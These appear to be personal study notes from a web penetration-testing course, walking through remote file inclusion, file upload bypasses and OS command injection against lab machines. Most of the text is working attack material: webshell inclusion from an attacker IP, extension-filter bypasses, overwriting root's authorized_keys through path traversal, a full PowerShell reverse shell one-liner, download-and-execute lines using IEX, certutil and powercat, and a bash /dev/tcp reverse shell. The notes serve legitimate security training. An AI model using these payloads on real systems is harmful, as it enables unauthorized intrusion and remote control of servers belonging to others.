Kali Linux includes several PHP _webshells_ in the **/usr/share/webshells/php/** directory that can be used for RFI
+ A webshell is a small script that provides a web-based command line interface, making it easier and more convenient to execute commands
+  this example, we will use the **simple-backdoor.php** webshell to exploit an RFI vulnerability in the "Mountain Desserts" web application

First, let's briefly review the contents of the **simple-backdoor.php** webshell
+ We'll use it to test the LFI vulnerability from the previous sections for RFI
+ The code is very similar to the PHP snippet we used in previous sections, It accepts commands in the _cmd_ parameter and executes them via the _system_ function

To leverage an RFI vulnerability, we need to make the remote file accessible by the target system. We can use the _Python3_ <mark style="background: #D2B3FFA6;">http.server</mark> module to start a web server on our Kali machine and serve the file we want to include remotely on the target system. Could also use a publicly-accessible file, such as one from Github.
+ The http.server module sets the web root to the current directory of our terminal:
```
python3 -m http.server 80
```

After the web server is running with **/usr/share/webshells/php/** as its current directory, we have completed all necessary steps on our attacking machine
+ We'll use **curl** to include the hosted file via HTTP and specify **ls** as our command
+ Usage: `curl "http://<DOMAIN>/<VULNERABLE_FILE>.php?page=http://<ATTACKER_IP>/simple-backdoor.php&cmd=ls"`
	+ Example output:
```
kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 

<pre>admin.php
bavarian.php
css
fonts
img
index.php
js
</pre>         
```
+ Above shows that we successfully exploited an RFI vulnerability by including a remotely hosted webshell
	+ Could now use Netcat again to create a reverse shell and receive an interactive shell on the target system, as in the LFI section

A good reverse shell for these purposes can be found on: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or in the `/usr/share/webshells/php/php-reverse-shell.php`
+ Will need to change the `$ip` and `$port` value to the attackers IP and the expected port for the <mark style="background: #D2B3FFA6;">netcat</mark> listener 

## File Upload Vulnerabilities 
Many web applications provide functionality to upload files
+ Will learn how to identify, exploit, and leverage File Upload vulnerabilities to access the underlying system or execute code
+ In general, we can group File Upload vulnerabilities into three categories

The first category consists of vulnerabilities enabling us to upload files that are *executable by the web application*. 
+ For example, if we can upload a PHP script to a web server where PHP is enabled, we can execute the script by accessing it via the browser or curl. 
+ As we observed in the File Inclusion Learning Unit, apart from PHP, we can also leverage this kind of vulnerability in other frameworks or server-side scripting languages.

The second category consists of vulnerabilities that require us to *combine the file upload mechanism with another vulnerability, such as Directory Traversal*. 
+ For example, if the web application is vulnerable to Directory Traversal, we can use a relative path in the file upload request and try to overwrite files like **authorized_keys**. 
+ Furthermore, we can also combine file upload mechanisms with _XML External Entity_ (XXE) or _Cross Site Scripting_ (XSS) attacks. 
+ For example, when we are allowed to upload an avatar to a profile with an _SVG_ file type, we may embed an XXE attack to display file contents or even execute code.

The third category relies on *user interaction*. 
+ For example, when we discover an upload form for job applications, we can try to upload a CV in **.docx** format with malicious _macros_ integrated. 
+ Since this category requires a person to access our uploaded file, we will focus on the other two kinds of file upload vulnerabilities in this Learning Unit.

### Using Executable Files
Depending on the web application and its usage, we can make educated guesses to locate upload mechanisms
+ If the web application is a _Content Management System_ (CMS), we can often upload an avatar for our profile or create blog posts and web pages with attached files
+ If our target is a company website, we can often find upload mechanisms in career sections or company-specific use cases
	+ For example, if the target website belongs to a lawyer's office, there may be an upload mechanism for case files
+ Sometimes the file upload mechanisms are not obvious to users, so we should never skip the enumeration phase when working with a web application

#### Case study - Mountain Desserts 
In this example, we will abuse a file upload mechanism to achieve code execution and obtain a reverse shell
+ Will review the "Mountain Desserts" web application on the _MOUNTAIN_ VM
+ Will open up Firefox and navigate to `http://192.168.50.189/meteor/`:
![[Pasted image 20230815225946.png]]
+ It shows that in the new version of the "Mountain Desserts" app, the _Admin_ link has been replaced by an upload form
+ The text explains that we can upload a picture to win a contest
+ The tab bar also shows an XAMPP icon displayed in the current tab, indicating the web application is likely running the XAMPP stack
+ The text explains that the company wanted to switch to Windows, so we can assume that the web application is now running on a Windows system
+ Let's find out if we can upload a text file instead of an image by making a text file and attempting to upload it:
```
echo "this is a test" > test.txt
```
+ Will upload the test file to the web application via the upload form in the browser:
![[Pasted image 20230815230132.png]]
+ We successfully uploaded our text file, so we know that the upload mechanism is not limited to images only
+ Next, let's attempt to upload the **simple-backdoor.php** webshell used in the previous Learning Unit:
![[Pasted image 20230815230239.png]]

The web application blocked our upload, stating that PHP files are not allowed and files with PHP file extensions are blacklisted 
+ Since don't know exactly how the filter is implemented, we'll use a trial-and-error approach to find ways to bypass it 
+ One method to bypass this filter is to *change the file extension* to a less-commonly used PHP file extension such as **.phps** or **.php7**
	+ This may allow us to bypass simple filters that only check for the most common file extensions, **.php** and **.phtml**
	+ These alternative file extensions were mostly used for older versions of PHP or specific use cases, but are still supported for compatibility in modern PHP versions
+ Another way we can bypass the filter is by *changing characters in the file extension to upper case*
	+ The blacklist may be implemented by comparing the file extension of the uploaded file to a list of strings containing only lower-case PHP file extensions
	+ If so, we can update the uploaded file extension with upper-case characters to bypass the filter

Will try updating our **simple-backdoor.php** file extension from **.php** to **.pHP**, and try to upload it via the web form:
![[Pasted image 20230815230600.png]]
+ This small change allowed us to bypass the filter and upload the file

Will confirm if we can use it to execute code
+ The output shows that our file was uploaded to the "uploads" directory, so we can assume there is a directory named "uploads"
+ Will use **curl** to provide **dir** as a command for the "cmd" parameter of our uploaded web shell:
```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
...
 Directory of C:\xampp\htdocs\meteor\uploads

04/04/2022  06:23 AM    <DIR>          .
04/04/2022  06:23 AM    <DIR>          ..
04/04/2022  06:21 AM               328 simple-backdoor.pHP
04/04/2022  06:03 AM                15 test.txt
               2 File(s)            343 bytes
               2 Dir(s)  15,410,925,568 bytes free
...
```
+ Above shows us the output of the **dir** command, confirming we can now execute commands on the target system

#### Obtaining a Reverse Shell on Windows 
We'll start a Netcat listener in a new terminal to catch the incoming reverse shell on port 4444:
```
nc -nvlp 4444
```

Will use a **PowerShell** one-liner for the reverse shell 
+ Since there are several special characters in the reverse shell one-liner, we will encode the string with base64
+ Can use _PowerShell_ or an online converter to perform the encoding

Powershell Reverse shell one liner:
``` Powershell
$client = New-Object System.Net.Sockets.TCPClient('10.211.55.3',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()  
```

Will use PowerShell on our Kali machine to encode the reverse shell one-liner
+ First, will create the variable _$Text_, which will be used for storing the reverse shell one-liner as a string:
``` PowerShell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```
+ Then, we can use the method _convert_ and the property _Unicode_ from the class _Encoding_ to encode the contents of the _$Text_ variable:
``` PowerShell
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
```
+ Can now see the encoded test with by typing `$EncodedText`

Will use **curl** to execute the encoded one-liner via the uploaded **simple-backdoor.pHP** 
+ Can add the base64 encoded string for the _powershell_ command using the **-enc** parameter, the beginning `powershell -enc <ENCODED_COMMAND>` will allow the encoded command to be translated and run in windows `cmd`
+ Will also need to use URL encoding for the spaces 
```
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```
+ After executing the command, we should *receive an incoming reverse shell* in the second terminal where <mark style="background: #D2B3FFA6;">Netcat</mark> is listening
	+ Can enumerate simple information to ensure it is working using `ipconfig` and `whoami` 

If the target web application was using ASP instead of PHP, we could have used the same process to obtain code execution as we did in the previous example, instead uploading an ASP web shell. 
+ Fortunately for us, Kali already contains a broad variety of web shells covering the frameworks and languages we discussed previously located in the **/usr/share/webshells/** directory:
```
kali@kali:~$ ls -la /usr/share/webshells
total 40
drwxr-xr-x   8 root root  4096 Feb 11 02:00 .
drwxr-xr-x 320 root root 12288 Apr 19 09:17 ..
drwxr-xr-x   2 root root  4096 Feb 11 01:58 asp
drwxr-xr-x   2 root root  4096 Apr 25 07:25 aspx
drwxr-xr-x   2 root root  4096 Feb 11 01:58 cfm
drwxr-xr-x   2 root root  4096 Apr 25 07:06 jsp
lrwxrwxrwx   1 root root    19 Feb 11 02:00 laudanum -> /usr/share/laudanum
drwxr-xr-x   2 root root  4096 Feb 11 01:58 perl
drwxr-xr-x   3 root root  4096 Feb 11 01:58 php
```
+ Above shows us the frameworks and languages for which Kali already offers web shells
+ It is important to understand that while the implementation of a web shell is dependent on the programming language, the basic process of using a web shell is nearly identical across these frameworks and languages
+ After we identify the framework or language of the target web application, we need to find a way to upload our web shell
+ The web shell needs to be placed in a location where we can access it
+ Next, we can provide commands to it, which are executed on the underlying system

We should be aware that the file types of our web shells may be blacklisted via a filter or upload mechanism
+ In situations like this, we can try to bypass the filter as in this section
+ However, there are other options to consider: Web applications handling and managing files often enable users to rename or modify files
	+ We could abuse this by uploading a file with an innocent file type like **.txt**, then changing the file back to the original file type of the web shell by renaming it 

### Using Non-Executable Files 
File uploads can have severe consequences even if there is no way for an attacker to execute the uploaded files
+ We may encounter scenarios where we find an unrestricted file upload mechanism, but cannot exploit it 
+ One example for this is _Google Drive_, where we can upload any file, but cannot leverage it to get system access 
+ In situations such as this, we need to leverage another vulnerability such as Directory Traversal to abuse the file upload mechanism

#### Case Study - Mountain Desserts
Let's begin to explore the updated "Mountain Desserts" web application by navigating to `http://mountaindesserts.com:8000`
![[Pasted image 20230817145055.png]]
+ We'll first notice that new version of the web application still allows us to upload files
+ The text also reveals that this version of the application is running on Linux
+ Furthermore, there is no _Admin_ link at the bottom of the page, and **index.php** is missing in the URL

Will use **curl** to confirm whether the **admin.php** and **index.php** files still exist
```
kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
404 page not found

kali@kali:~$ curl http://mountaindesserts.com:8000/meteor/index.php
404 page not found

kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
404 page not found
```
+ Above shows that the **index.php** and **admin.php** files no longer exist in the web application
+ Can safely assume that the web server is no longer using PHP

Will try to upload a text file
+ We'll start Burp to capture the requests and use the form on the web application to upload the **test.txt** file from the previous section
+ The file was successfully uploaded according to the web application's output
+ **Note**: When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use

Will review the **test.txt** upload request in Burp
+ We'll select the POST request in _HTTP history_, send it to Repeater, and click on _Send_
![[Pasted image 20230817145412.png]]
+ Above shows we receive the same output as we did in the browser, without any new or valuable information

Next, let's check if the web application allows us to specify a relative path in the filename and write a file via Directory Traversal outside of the web root
+ We can do this by modifying the "filename" parameter in the request so it contains **../../../../../../../test.txt**, then click _send_:
![[Pasted image 20230818093726.png]]
+ The _Response_ area shows us that the output includes the **../** sequences
+ Unfortunately, we have no way of knowing if the relative path was used for placing the file
+ It's possible that the web application's response merely echoed our filename and sanitized it internally

For now, let's assume the relative path was used for placing the file, since we cannot find any other attack vector
+ If our assumption is correct, we can try to blindly overwrite files, which may lead us to system access
+ We should be aware, that blindly overwriting files in a real-life penetration test could result in lost data or costly downtime of a production system

Before moving forward, let's briefly review web server accounts and permissions
+ Web applications using _Apache_, _Nginx_ or other dedicated web servers often run with specific users, such as _www-data_ on Linux
+ Traditionally on *Windows*, the IIS web server runs as a _Network Service_ account, a passwordless built-in Windows identity with low privileges
	+ Starting with IIS version 7.5, Microsoft introduced the _IIS Application Pool Identities_
	+ These are virtual accounts running web applications grouped by _application pools_
	+ Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications

When using programming languages that include their own web server, administrators and developers often deploy the web application without any privilege structures by running applications as _root_ or _Administrator_ to avoid any permissions issues
+ This means we should always verify whether we can leverage root or administrator privileges in a file upload vulnerability

Let's try to overwrite the **authorized_keys** file in the home directory for _root_
+ If this file contains the public key of a private key we control, we can access the system via SSH as the _root_ user
+ To do this, we'll create an SSH keypair with **ssh-keygen**,  well as a file with the name **authorized_keys** containing the previously created public key
+ <mark style="background: #D2B3FFA6;">ssh-keygen</mark> usage: `ssh-keygen` 
	+ Example:
```
kali@kali:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

kali@kali:~$ cat fileup.pub > authorized_keys
```
+ Now that the **authorized_keys** file contains our public key, we can upload it using the relative path `../../../../../../../root/.ssh/authorized_keys`
+ Will select our **authorized_keys** file in the file upload form and enable intercept in Burp before we click on the _Upload_ button
+ When Burp shows the intercepted request, we can modify the filename accordingly and press _Forward_:
![[Pasted image 20230818094308.png]]
+ Above shows the specified relative path for our **authorized_keys** file
+ Will want to **remove the user information comment** at the end 

If we've successfully overwritten the **authorized_keys** file of the _root_ user, we should be able to use our private key to connect to the system via SSH
+ We should note that often the _root_ user does not carry SSH access permissions
+ However, since we can't check for other users by, for example, displaying the contents of **/etc/passwd**, this is our only option

The target system runs an SSH server on port 2222
+ Let's use the corresponding private key of the public key in the **authorized_keys** file to try to connect to the system
+ We'll use the **-i** parameter to specify our private key and **-p** for the port
+ Usage: `ssh -p <PORT> -i <PRIVATE_KEY> <USER>@<IP>`

In the Directory Traversal Learning Unit, we connected to port `2222` on the host **mountaindesserts.com** and our Kali system saved the host key of the remote host
+ Since the target system of this section is a different machine, SSH will throw an error because it cannot verify the host key it saved previously
+ To avoid this error, we'll delete the **known_hosts** file before we connect to the system
	+ This file contains all host keys of previous SSH connections
```
kali@kali:~$ rm ~/.ssh/known_hosts

kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#
```

We could successfully connect as _root_ with our private key due to the overwritten **authorized_keys** file.
+ Facing a scenario in which we can't use a file upload mechanism to upload executable files, we'll need to get creative to find other vectors we can leverage

## Command Injection 

### OS Command Injection 
Web applications often need to interact with the underlying operating system, such as when a file is created through a file upload mechanism
+ Web applications should always offer specific APIs or functionalities that use prepared commands for the interaction with the system
+ Prepared commands provide a set of functions to the underlying system that cannot be changed by user input
+ However, these APIs and functions are often very time consuming to plan and develop

Sometimes a web application needs to address a multitude of different cases, and a set of predefined functions can be too inflexible
+ In these cases, web developers often tend to directly accept user input, then sanitize it 
+ This means that user input is filtered for any command sequences that might try to change the application's behavior for malicious purposes

For this demonstration, let's review the "Mountain Vaults" web application, running on port 8000 on the _MOUNTAIN_ system
![[Pasted image 20230828085503.png]]
+ In this version, we're able to clone git repositories by entering the **git clone** command combined with a URL
+ The example shows us the same command we would use in the command line
+ We can hypothesize that maybe the operating system will execute this string and, therefore, we may be able to inject our own commands

Let's try to use the form to clone the _ExploitDB_ repository: 
``` 
git clone https://gitlab.com/exploit-database/exploitdb.git
```
+ After we click on _submit_ the cloning process of the ExploitDB repository starts
![[Pasted image 20230828085756.png]]
+ The output shows that the repository was successfully cloned, also the actual command is displayed in the web application's output

Can try to inject arbitrary commands such as **ipconfig**, **ifconfig**, and **hostname** with **curl**
+ We'll switch over to _HTTP history_ in Burp to understand the correct structure for the POST request
+ The request indicates the "Archive" parameter is used for the command: 
![[Pasted image 20230828085907.png]]
+ The figure shows that the "Archive" parameter contains the Git command
+ This means we can use **curl** to provide our own commands to the parameter
+ We'll do this by using the **-X** parameter to change the request type to POST
+ We'll also use **--data** to specify what data is sent in the POST request

Command to inject into the Archive parameter:
```
curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
```
+ Output:
```
Command Injection detected. Aborting...%!(EXTRA string=ipconfig)
```
+ Above shows that the web application detected a command injection attempt with the **ipconfig** command

Will need to backtrack from the working input and find a bypass for the filter
+ Next, we'll try to only provide the **git** command for the Archive parameter in the POST request:
```
curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
```
+ Output:
```
An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C <path>] [-c <name>=<value>]
           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
...
   push      Update remote refs along with associated objects

'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.
```
+ The output shows the help page for the **git** command, confirming that we are not restricted to only using **git clone**

Since we know that only providing "git" works for execution, we can try to add the **version** subcommand
+ If this is executed, we'll establish that we can specify any **git** command and achieve code execution
+ This will also reveal if the web application is running on Windows or Linux, since the output of **git version** includes the "Windows" string in _Git for Windows_
+ If the web application is running on Linux, it will only show the version for Git:
```
curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
```
+ Output:
```
Repository successfully cloned with command: git version and output: git version 2.35.1.windows.2
```
+ The output shows that the web application is running on Windows
+ Now we can use trial-and-error to poke around the filter and review what's allowed

Since we established that we cannot simply specify another command, let's try to combine the **git** and **ipconfig** commands with a URL-encoded semicolon represented as `%3B`
+ Semicolons can be used in a majority of command lines, such as PowerShell or Bash as a delimiter for multiple commands
+ Alternatively, we can use two ampersands, `&&`, to specify two consecutive commands
+ For the Windows command line _(CMD)_, we can also use one ampersand
```
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
```
+ Output:
```
...
'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.50.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
```
+ The output shows that both commands were executed
+ We can assume that there is a filter in place checking if "git" is executed or perhaps contained in the "Archive" parameter

Next, let's find out more about how our injected commands are executed
+ We will first determine if our commands are executed by PowerShell or CMD
+ In a situation like this, we can use a handy snippet, published by _PetSerAl_ that displays "CMD" or "PowerShell" depending on where it is executed:
``` PowerShell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

We'll use URL encoding once again to send it:
```
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```
+ Output:
```
...
See 'git help git' for an overview of the system.
PowerShell
```
+ The output contains "PowerShell", meaning that our injected commands are executed in a PowerShell environment

Can now leverage command injection to achieve system access
+ We will use _Powercat_ to create a reverse shell
+ *Powercat* is a PowerShell implementation of Netcat included in Kali
+ Let's start a new terminal, copy *Powercat* to the home directory for the _kali_ user, and start a Python3 web server in the same directory
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

python3 -m http.server 80

nc -nvlp 4444
```

With our web server serving **powercat.ps1** and Netcat listener in place, we can now use **curl** in the first terminal to inject the following command
+ It consists of two parts delimited by a semicolon
+ The first part uses a PowerShell download cradle to load the Powercat function contained in the **powercat.ps1** script from our web server
+ The second command uses the _powercat_ function to create the reverse shell with the following parameters: **-c** to specify where to connect, **-p** for the port, and **-e** for executing a program
``` Powershell
powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
```

From cmd:
``` powershell
certutil.exe -urlcache -split -f http://192.168.45.168:80/nc.exe nc.exe; .\nc.exe 192.168.45.168 4444 -e cmd
```

Another option is from CMD:
``` powershell
certutil.exe -urlcache -split -f http://192.168.45.168:80/powercat.ps1 C:\Windows\Temp\powercat.ps1 & powershell.exe -ExecutionPolicy Bypass -File "C:\Windows\Temp\powercat.ps1" -c 192.168.45.168 -p 4444 -e powershell
```

Again, we'll use URL encoding for the command and send it:
```
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```
+ After entering the command, the second terminal should show that we received a GET request for the **powercat.ps1** file
+ We'll also find an incoming reverse shell connection in the third terminal for our active Netcat listener:
```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents\meteor>
```
+ Instead of using Powercat, we could also inject a PowerShell reverse shell directly
+ There are many ways to exploit a command injection vulnerability that depend heavily on the underlying operating system and the implementation of the web application, as well as any security mechanisms in place

Backtick(**\`**): can be used to for command injection 
+ Text between backticks is executed and replaced by the output of the command
+ So if the input will interpret it on the shell, can run a reverse shell like this:
	+ \`bash -c "bash -i >& /dev/tcp/192.168.45.211/4444 0>&1"\`
#### Cheat Sheet and Tricks
Cheat Sheet:
+ https://book.hacktricks.xyz/pentesting-web/command-injection
+ https://hackersonlineclub.com/command-injection-cheatsheet/
